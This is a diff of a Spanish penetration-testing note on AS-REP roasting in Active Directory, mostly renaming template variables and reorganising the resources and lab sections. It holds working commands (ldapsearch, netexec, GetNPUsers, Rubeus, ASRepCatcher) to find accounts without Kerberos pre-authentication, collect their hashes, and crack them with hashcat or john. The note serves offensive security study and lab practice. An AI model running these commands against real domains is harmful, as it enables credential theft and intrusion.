@@ -10,11 +10,11 @@ El proceso de **pre-autenticación** puede ser eliminado de una cuenta mediante 
 
 ![[kerberos-dontpreauth.excalidraw|center]]
 
-Las cuentas con `DONT_REQ_PREAUTH` son vulnerables a [[AS-REP roasting]].
-
 # Vulnerabilidad
 
 Algunas aplicaciones no soportan la **pre-autenticación** de Kerberos, por lo que es común encontrar usuarios con la opción `DONT_REQ_PREAUTH` habilitada.
+
+Las cuentas con `DONT_REQ_PREAUTH` son vulnerables a [[AS-REP Roasting]].
 
 Los atacantes pueden solicitar **TGT**s en nombre de cualquier usuario sin saber su contraseña (ya que no necesitan cifrar el *timestamp*) y crackear offline las *Session Keys* recibidas (debido a que van cifradas con la contraseña).
 
@@ -53,7 +53,7 @@ ldapsearch -H ldap://${DOMAIN} -x -b ${BASEDN} '(&(samAccountType=805306368)(use
 ```
 <span type="end"></span>
 
-<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/dn,_/variables/hacking.md/password,_/variables/hacking.md/basedn, code = # credenciales
+<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/dn,_/variables/hacking.md/pass,_/variables/hacking.md/basedn, code = # credenciales
 ldapsearch -H ldap://{{domain}} -D {{dn}} -w {{pass}} -b {{basedn}} &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27;, lang = )"></span>
 ``` 
 # credenciales
@@ -64,27 +64,27 @@ ldapsearch -H ldap://${DOMAIN} -D ${DN} -w ${PASS} -b ${BASEDN} '(&(samAccountTy
 
 tab: netexec
 
-<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/users, code = # fuerza bruta
-netexec ldap {{target}} -u {{users}} -p '' -k, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts,_/variables/hacking.md/users, code = # fuerza bruta
+netexec ldap {{rhosts}} -u {{users}} -p '' -k, lang = )"></span>
 ``` 
 # fuerza bruta
-netexec ldap ${TARGET} -u ${USERS} -p '' -k
+netexec ldap ${RHOSTS} -u ${USERS} -p '' -k
 ```
 <span type="end"></span>
 
-<span query="codeBlock(_/variables/hacking.md/target, code = # anonymous
-netexec ldap {{target}} -u '' -p '' --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts, code = # anonymous
+netexec ldap {{rhosts}} -u '' -p '' --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
 ``` 
 # anonymous
-netexec ldap ${TARGET} -u '' -p '' --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
+netexec ldap ${RHOSTS} -u '' -p '' --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
 ```
 <span type="end"></span>
 
-<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
-netexec ldap {{target}} -u {{user}} -p {{pass}} --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts,_/variables/hacking.md/user,_/variables/hacking.md/pass, code = # credenciales
+netexec ldap {{rhosts}} -u {{user}} -p {{pass}} --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
 ``` 
 # credenciales
-netexec ldap ${TARGET} -u ${USER} -p ${PASS} --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
+netexec ldap ${RHOSTS} -u ${USER} -p ${PASS} --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
 ```
 <span type="end"></span>
 
@@ -138,9 +138,9 @@ GetNPUsers.py -usersfile ${USERS} -no-pass -outputfile asreproast.txt '${DOMAIN}
 
 tab: netexec
 
-<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/users, code = nxc ldap {{target}} -u {{users}} -p &amp;#x27;&amp;#x27; --asreproast asreproast.txt, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts,_/variables/hacking.md/users, code = nxc ldap {{rhosts}} -u {{users}} -p &amp;#x27;&amp;#x27; --asreproast asreproast.txt, lang = )"></span>
 ``` 
-nxc ldap ${TARGET} -u ${USERS} -p '' --asreproast asreproast.txt
+nxc ldap ${RHOSTS} -u ${USERS} -p '' --asreproast asreproast.txt
 ```
 <span type="end"></span>
 
@@ -159,8 +159,8 @@ GetNPUsers.py -request -outputfile asreproast.txt '${DOMAIN}/'
 ```
 <span type="end"></span>
 
-<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
-GetNPUsers.py -request -outputfile asreproast.txt &amp;#x27;{{domain}}/{{user}}:{{password}}&amp;#x27;, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/pass, code = # credenciales
+GetNPUsers.py -request -outputfile asreproast.txt &amp;#x27;{{domain}}/{{user}}:{{pass}}&amp;#x27;, lang = )"></span>
 ``` 
 # credenciales
 GetNPUsers.py -request -outputfile asreproast.txt '${DOMAIN}/${USER}:${PASS}'
@@ -170,27 +170,27 @@ GetNPUsers.py -request -outputfile asreproast.txt '${DOMAIN}/${USER}:${PASS}'
 
 tab: netexec
 
-<span query="codeBlock(_/variables/hacking.md/target, code = # anonymous
-nxc ldap {{target}} -u '' -p '' --asreproast asreproast.txt, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts, code = # anonymous
+nxc ldap {{rhosts}} -u '' -p '' --asreproast asreproast.txt, lang = )"></span>
 ``` 
 # anonymous
-nxc ldap ${TARGET} -u '' -p '' --asreproast asreproast.txt
+nxc ldap ${RHOSTS} -u '' -p '' --asreproast asreproast.txt
 ```
 <span type="end"></span>
 
-<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
-nxc ldap {{target}} -u {{user}} -p {{password}} --asreproast asreproast.txt, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts,_/variables/hacking.md/user,_/variables/hacking.md/pass, code = # credenciales
+nxc ldap {{rhosts}} -u {{user}} -p {{pass}} --asreproast asreproast.txt, lang = )"></span>
 ``` 
 # credenciales
-nxc ldap ${TARGET} -u ${USER} -p ${PASS} --asreproast asreproast.txt
+nxc ldap ${RHOSTS} -u ${USER} -p ${PASS} --asreproast asreproast.txt
 ```
 <span type="end"></span>
 
 
 tab: Rubeus
 
-<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
-Rubeus.exe asreproast /domain:{{domain}} /user:{{user}} /password:{{password}} /outfile:asreproast.txt, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/user,_/variables/hacking.md/pass, code = # credenciales
+Rubeus.exe asreproast /domain:{{domain}} /user:{{user}} /password:{{pass}} /outfile:asreproast.txt, lang = )"></span>
 ``` 
 # credenciales
 Rubeus.exe asreproast /domain:${DOMAIN} /user:${USER} /password:${PASS} /outfile:asreproast.txt
@@ -211,9 +211,9 @@ Otra forma de realizar AS-REP roasting **sin depender de que la pre-autenticaci�
 ~~~tabs
 tab: ASRepCatcher
 
-<span query="codeBlock(_/variables/hacking.md/target, code = ASRepCatcher -dc {{target}}, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/rhosts, code = ASRepCatcher -dc {{rhosts}}, lang = )"></span>
 ``` 
-ASRepCatcher -dc ${TARGET}
+ASRepCatcher -dc ${RHOSTS}
 ```
 <span type="end"></span>
 
@@ -228,24 +228,24 @@ Es posible **crackear los hashes** obtenidos mediante `netexec`, `GetNPUsers` y 
 ~~~tabs
 tab: hashcat
 
->[!tldr] 18200 | Kerberos 5, etype 23, AS-REP
-
 <span query="codeBlock(_/variables/hacking.md/wordlist, code = hashcat -m 18200 asreproast.txt {{wordlist}}, lang = )"></span>
 ``` 
 hashcat -m 18200 asreproast.txt ${WORDLIST}
 ```
 <span type="end"></span>
 
+>[!tldr] 18200 | Kerberos 5, etype 23, AS-REP
+
 
 tab: john
-
->[!tldr] --format=krb5asrep
 
 <span query="codeBlock(_/variables/hacking.md/wordlist, code = john --wordlist={{wordlist}} asreproast.txt, lang = )"></span>
 ``` 
 john --wordlist=${WORDLIST} asreproast.txt
 ```
 <span type="end"></span>
+
+>[!tldr] --format=krb5asrep
 
 ~~~
 
@@ -254,21 +254,39 @@ Es posible **crackear los hashes** obtenidos mediante `ASRepCatcher` usando el s
 ~~~tabs
 tab: hashcat
 
->[!tldr] 32200 | Kerberos 5, etype 18, AS-REP
-
 <span query="codeBlock(_/variables/hacking.md/wordlist, code = hashcat -m 18200 asreproast.txt {{wordlist}}, lang = )"></span>
 ``` 
 hashcat -m 18200 asreproast.txt ${WORDLIST}
 ```
 <span type="end"></span>
 
+>[!tldr] 32200 | Kerberos 5, etype 18, AS-REP
+
 ~~~
 
-# Entornos de práctica
-
-### Ofensivo
+# Recursos
 
 ~~~tabs
+
+tab: Herramientas
+
+| Repositorio                                                        | Descripción                                                    |
+| ------------------------------------------------------------------ | -------------------------------------------------------------- |
+| [`asrepcatcher`](https://github.com/Yaxxine7/ASRepCatcher)         | Make everyone in your VLAN ASRep roastable                     |
+| [`bloodhound`](https://www.kali.org/tools/bloodhound/)             | Six degrees of Domain Admin                                    |
+| [`hashcat`](https://www.kali.org/tools/hashcat/)                   | World’s fastest and most advanced password recovery utility    |
+| [`impacket`](https://www.kali.org/tools/impacket/)                 | Python3 module to easily build and dissect network protocols   |
+| [`impacket-scripts`](https://www.kali.org/tools/impacket-scripts/) | Links to useful impacket scripts examples                      |
+| [`john`](https://www.kali.org/tools/john/)                         | Active password cracking tool                                  |
+| [`kerbrute`](https://github.com/TarlogicSecurity/kerbrute)         | Kerberos bruteforcing by using impacket                        |
+| [`ldap-utils`](https://wiki.debian.org/LDAP/LDAPUtils)             | Utilities that can be used to perform queries on a LDAP server |
+| [`netexec`](https://www.kali.org/tools/netexec/)                   | Network execution tool                                         |
+| [`rubeus`](https://www.kali.org/tools/rubeus/)                     | Raw Kerberos interaction and abuses                            |
+
+
+tab: Labs Ofensivos
+
+````tabs
 
 tab: HTB
 
@@ -355,11 +373,12 @@ favicon: https://github.githubassets.com/favicons/favicon.svg
 image: https://opengraph.githubassets.com/6df3b9c7bb50447380c8c44df0c16fe7b85ecc1c55a233697fad318da7515cac/safebuffer/vulnerable-AD
 ```
 
-~~~
+````
 
-### Defensivo
 
-~~~tabs
+tab: Labs Defensivos
+
+````tabs
 
 tab: HTB
 
@@ -402,4 +421,5 @@ image: https://academy.hackthebox.com/storage/modules/306/logo.png
 favicon: https://www.hackthebox.com/images/landingv3/favicon.png
 ```
 
+````
 ~~~
